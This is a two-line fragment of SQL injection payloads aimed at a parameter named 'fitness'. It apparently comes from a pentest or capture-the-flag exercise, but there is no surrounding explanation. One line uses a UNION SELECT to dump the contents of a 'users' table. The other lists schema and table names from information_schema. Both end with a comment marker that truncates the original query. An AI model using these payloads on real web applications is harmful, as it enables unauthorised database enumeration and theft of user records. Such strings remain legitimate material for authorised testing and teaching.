fitness = 1 UNION (SELECT *,0,0 FROM users);--
fitness = 1 UNION (SELECT TABLE_SCHEMA,TABLE_NAME,0,0,0 FROM information_schema.tables);--